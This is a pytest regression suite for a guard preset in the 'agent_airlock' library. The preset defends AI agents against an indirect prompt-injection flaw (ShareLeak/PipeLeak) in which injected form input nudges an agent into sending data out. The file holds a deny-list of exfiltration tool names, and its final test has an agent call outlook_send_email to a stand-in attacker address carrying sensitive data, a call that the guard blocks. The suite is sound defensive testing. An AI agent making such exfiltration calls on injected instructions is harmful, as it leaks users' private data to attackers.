"""CVE-2026-21520 (Capsule ShareLeak / PipeLeak) preset regression tests.

Pins the deny-by-default + denied-exfil-sinks + reauth-on-untrusted
posture of :func:`capsule_indirect_injection_cve_2026_21520_defaults`
end-to-end:

- Eagerly-constructed defaults are byte-identical to a fresh factory call.
- Empty ``allowed_tools`` denies any read-side call (default_deny).
- Every canonical exfil sink in the bundle is denied by name AND by glob.
- Operator-supplied ``allowed_tools`` admits the read-side tool; same
  call to an exfil sink still denies.
- ``extra_denied_tools`` extends the deny-list (vendor-specific sinks).
- ``reauth_on_untrusted_reinvocation`` + threshold are exactly the
  v0.8.6 strictest setting.
- The factory is discoverable via ``policy_presets.list_active()``.
- ``UnknownArgsMode.BLOCK`` is set on the returned :class:`AirlockConfig`.
"""

from __future__ import annotations

import pytest

from agent_airlock import (
    CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS,
    Airlock,
    AirlockContext,
    PolicyViolation,
    capsule_indirect_injection_cve_2026_21520_defaults,
)
from agent_airlock.policy_presets import (
    _CAPSULE_INDIRECT_INJECTION_EXFIL_SINKS,
    _CAPSULE_INDIRECT_INJECTION_TOOL_CORPUS,
    list_active,
)
from agent_airlock.unknown_args import UnknownArgsMode

# ---------------------------------------------------------------------------
# Structural / discovery
# ---------------------------------------------------------------------------


class TestPresetStructure:
    def test_eager_default_is_dict_with_expected_keys(self) -> None:
        g = CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS
        assert isinstance(g, dict)
        assert {
            "policy",
            "airlock_config",
            "denied_sinks",
            "tool_corpus",
            "source",
            "capsule_disclosure",
        } <= set(g)

    def test_source_points_to_nvd(self) -> None:
        g = capsule_indirect_injection_cve_2026_21520_defaults()
        assert g["source"] == "https://nvd.nist.gov/vuln/detail/CVE-2026-21520"

    def test_capsule_blog_link_is_present(self) -> None:
        g = capsule_indirect_injection_cve_2026_21520_defaults()
        assert "capsulesecurity.io" in g["capsule_disclosure"]
        assert "shareleak" in g["capsule_disclosure"].lower()

    def test_canonical_corpus_covers_both_shareleak_and_pipeleak(self) -> None:
        corpus = set(_CAPSULE_INDIRECT_INJECTION_TOOL_CORPUS)
        # ShareLeak — Copilot Studio / SharePoint / Outlook surface.
        assert "sharepoint_query" in corpus
        assert "outlook_send_email" in corpus
        # PipeLeak — Agentforce / Web-to-Lead surface.
        assert "agentforce_web_to_lead_handler" in corpus
        assert "agentforce_create_case" in corpus

    def test_factory_listed_by_list_active(self) -> None:
        """The factory ends in ``_defaults`` and takes only kwargs with
        defaults, so :func:`policy_presets.list_active` must include it."""
        ids = {m.preset_id for m in list_active()}
        assert "capsule_indirect_injection_cve_2026_21520_defaults" in ids


# ---------------------------------------------------------------------------
# Policy posture
# ---------------------------------------------------------------------------


class TestPolicyPosture:
    def test_default_deny_is_true(self) -> None:
        policy = capsule_indirect_injection_cve_2026_21520_defaults()["policy"]
        assert policy.default_deny is True

    def test_allowed_tools_defaults_to_empty(self) -> None:
        """Empty allow-list under default_deny == nothing callable.
        Operator must opt every read-side tool in by name."""
        policy = capsule_indirect_injection_cve_2026_21520_defaults()["policy"]
        assert policy.allowed_tools == []

    def test_reauth_on_untrusted_reinvocation_is_strictest(self) -> None:
        """The v0.8.6 debate-amplification guard at its tightest setting."""
        policy = capsule_indirect_injection_cve_2026_21520_defaults()["policy"]
        assert policy.reauth_on_untrusted_reinvocation is True
        assert policy.untrusted_reinvocation_threshold == 1

    def test_airlock_config_has_unknown_args_block(self) -> None:
        """Closes the smuggle-a-hallucinated-arg-past-the-validator path."""
        cfg = capsule_indirect_injection_cve_2026_21520_defaults()["airlock_config"]
        assert cfg.unknown_args is UnknownArgsMode.BLOCK


# ---------------------------------------------------------------------------
# Exfil-sink deny-by-default (the core regression)
# ---------------------------------------------------------------------------


class TestExfilSinksDenied:
    """Every canonical exfil sink must be DENIED by the preset, even when
    the operator has opted in a read-side allow-list."""

    @pytest.fixture
    def policy_with_reads_admitted(self):
        """Policy where the operator has admitted the canonical read-side
        tools; exfil sinks must STILL be denied."""
        return capsule_indirect_injection_cve_2026_21520_defaults(
            allowed_tools=("sharepoint_query", "sharepoint_search"),
        )["policy"]

    @pytest.mark.parametrize(
        "exfil_tool",
        [
            "send_email",
            "send_mail",
            "outlook_send_email",
            "outlook_create_draft",
            "smtp_relay",
            "create_case",
            "create_lead",
            "post_to_chatter",
            "salesforce_send_email",
            "send_message",
            "share_with_external",
            "export_records",
            "post_to_webhook",
            "webhook_dispatch",
            "publish_to_topic",
            "upload_to_drive",
            "external_post",
            "http_request",
            "http_post",
            "fetch_url",
        ],
    )
    def test_exfil_sink_denied_under_default_only(self, exfil_tool: str) -> None:
        """No operator opt-in: deny-by-default rejects every exfil sink."""
        policy = capsule_indirect_injection_cve_2026_21520_defaults()["policy"]
        with pytest.raises(PolicyViolation):
            policy.check_tool_allowed(exfil_tool)

    @pytest.mark.parametrize(
        "exfil_tool",
        [
            "outlook_send_email",
            "create_case",
            "share_with_external",
            "webhook_dispatch",
        ],
    )
    def test_exfil_sink_still_denied_when_read_side_admitted(
        self, policy_with_reads_admitted, exfil_tool: str
    ) -> None:
        """The brief invariant: even with a read-side allow-list, the
        exfil sinks remain DENIED. That's the deny-list precedence."""
        with pytest.raises(PolicyViolation):
            policy_with_reads_admitted.check_tool_allowed(exfil_tool)

    def test_denied_sinks_set_advertised_in_bundle(self) -> None:
        """The audit / telemetry consumer needs the canonical sink globs."""
        g = capsule_indirect_injection_cve_2026_21520_defaults()
        assert tuple(g["denied_sinks"]) == _CAPSULE_INDIRECT_INJECTION_EXFIL_SINKS


# ---------------------------------------------------------------------------
# Operator extension surface
# ---------------------------------------------------------------------------


class TestOperatorExtensions:
    def test_allowed_tools_opt_in_admits_read_side(self) -> None:
        policy = capsule_indirect_injection_cve_2026_21520_defaults(
            allowed_tools=("sharepoint_query",),
        )["policy"]
        # Admitted — does not raise.
        policy.check_tool_allowed("sharepoint_query")

    def test_extra_denied_tools_extends_the_set(self) -> None:
        """Operator with vendor-specific sinks (Slack, ServiceNow, ...)
        must be able to extend without forking the preset."""
        policy = capsule_indirect_injection_cve_2026_21520_defaults(
            extra_denied_tools=("slack_webhook_*",),
        )["policy"]
        with pytest.raises(PolicyViolation):
            policy.check_tool_allowed("slack_webhook_alerts")

    def test_factory_fresh_each_call_no_aliasing(self) -> None:
        """Two calls must yield distinct AirlockConfig instances so an
        operator mutating one doesn't poison the other."""
        a = capsule_indirect_injection_cve_2026_21520_defaults()
        b = capsule_indirect_injection_cve_2026_21520_defaults()
        assert a["airlock_config"] is not b["airlock_config"]
        assert a["policy"] is not b["policy"]


# ---------------------------------------------------------------------------
# End-to-end @Airlock seam
# ---------------------------------------------------------------------------


class TestAirlockSeamEndToEnd:
    """The full @Airlock decoration path: read tool admitted, exfil
    blocked through the existing handle_policy_violation chain."""

    def test_read_tool_admitted_when_in_allow_list(self) -> None:
        guard = capsule_indirect_injection_cve_2026_21520_defaults(
            allowed_tools=("sharepoint_query",),
        )

        @Airlock(policy=guard["policy"], config=guard["airlock_config"])
        def sharepoint_query(q: str) -> str:
            return f"results for {q}"

        with AirlockContext(agent_id="agent-copilot-studio"):
            result = sharepoint_query("project alpha")

        assert result == "results for project alpha"

    def test_exfil_sink_blocked_at_airlock_seam(self) -> None:
        """The ShareLeak/PipeLeak scenario, end-to-end: a tool the agent
        was nudged into calling via injected form input returns a blocked
        AirlockResponse instead of executing the exfil."""
        guard = capsule_indirect_injection_cve_2026_21520_defaults(
            allowed_tools=("sharepoint_query",),
        )

        @Airlock(policy=guard["policy"], config=guard["airlock_config"])
        def outlook_send_email(to: str, body: str) -> str:
            # The body would be the data we exfil; we must never get here.
            return "sent"

        with AirlockContext(agent_id="agent-copilot-studio"):
            blocked = outlook_send_email(to="exfil@attacker.example", body="<sensitive data>")

        assert isinstance(blocked, dict)
        assert blocked.get("status") == "blocked"
        assert "outlook_send_email" in blocked.get("error", "")
